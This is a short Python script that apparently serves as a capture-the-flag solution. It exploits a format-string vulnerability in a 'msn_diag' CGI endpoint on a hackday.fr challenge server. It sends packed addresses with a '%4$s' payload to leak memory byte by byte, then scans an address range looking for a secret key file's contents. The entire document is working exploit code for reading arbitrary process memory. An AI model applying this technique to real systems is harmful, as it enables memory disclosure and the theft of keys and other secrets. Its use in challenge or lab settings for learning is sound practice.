#!/usr/bin/env python3
import urllib.request
import urllib.parse
import struct
import time

BASE = "http://millenium-messenger.hackday.fr:8000"

def send_msg_raw(body_bytes):
    encoded = urllib.parse.quote(body_bytes, safe='')
    url = f"{BASE}/cgi-bin/msn_diag?cmd=MSG&body={encoded}"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            return resp.read()
    except Exception as e:
        return b""

def extract_diag(raw):
    marker = b'DIAG '
    idx = raw.find(marker)
    if idx >= 0:
        return raw[idx+5:].rstrip(b'\r\n')
    return raw

def read_memory_byte(addr):
    # Use a unique marker to find where the leaked data starts
    payload = struct.pack('<I', addr) + b"MARK" + b"%4$s"
    raw_resp = send_msg_raw(payload)
    content = extract_diag(raw_resp)
    
    marker = b"MARK"
    idx = content.find(marker)
    if idx >= 0:
        # The data after MARK is the result of %4$s
        leaked = content[idx+len(marker):]
        if leaked:
            return leaked[0] # Return first byte
    return 0 # Default to 0 (null byte or error)

def read_16_bytes(addr):
    buf = []
    for i in range(16):
        b = read_memory_byte(addr + i)
        buf.append(b)
    return bytes(buf)

# Let's try to find the actual key.
# It's loaded from /app/data/msn_epoch.key.
# Let's search for "Project Epoch" or similar strings in memory first 
# to find where the classified data is, the key might be nearby.

print("=== Scanning for the real key (skipping payload bytes) ===")
# Let's check 0x08049530 again, but correctly this time.
# Also scan a bit further.
for addr in range(0x08049500, 0x0804a000, 32):
    key_cand = read_16_bytes(addr)
    if any(b != 0 for b in key_cand):
        print(f"0x{addr:08x}: {key_cand.hex()} | {repr(key_cand)}")
    time.sleep(0.05)
